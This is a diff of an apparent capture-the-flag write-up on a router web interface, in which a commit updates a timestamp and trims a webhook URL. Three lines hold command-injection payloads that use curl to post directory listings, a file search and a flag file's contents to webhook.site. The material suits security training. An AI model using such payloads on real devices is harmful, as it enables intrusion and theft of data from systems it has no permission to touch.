@@ -1,6 +1,6 @@
 ---
 created: 2024-06-15T04:41
-updated: 2024-06-15T19:09
+updated: 2024-06-21T21:30
 ---
 
 > We are developing a new router but not sure if the interface has bug or not. Could you have a look?
@@ -34,13 +34,13 @@ Payload will be `"; CMD; echo "`, probably not the shortest but it will do the t
 I will also send all results via curl to webhook.site.
 
 ```
-"; curl -X POST -d "$(ls -la)" https://webhook.site/90de7544-e0ce-4e71-a263-c9613287c858; echo "
+"; curl -X POST -d "$(ls -la)" https://webhook.site; echo "
 ```
 
 `ls` didn't find anything, maybe its some flag.txt thing.
 
 ```
-"; curl -X POST -d "$(find / -type f -name "*flag*")" https://webhook.site/90de7544-e0ce-4e71-a263-c9613287c858; echo "
+"; curl -X POST -d "$(find / -type f -name "*flag*")" https://webhook.site; echo "
 ```
 
 And there it is.
@@ -65,7 +65,7 @@ And there it is.
 One last step from `/home/user/flag.txt`
 
 ```
-"; curl -X POST -d "$(cat /home/user/flag.txt)" https://webhook.site/90de7544-e0ce-4e71-a263-c9613287c858; echo "
+"; curl -X POST -d "$(cat /home/user/flag.txt)" https://webhook.site; echo "
 ```
 
 ```
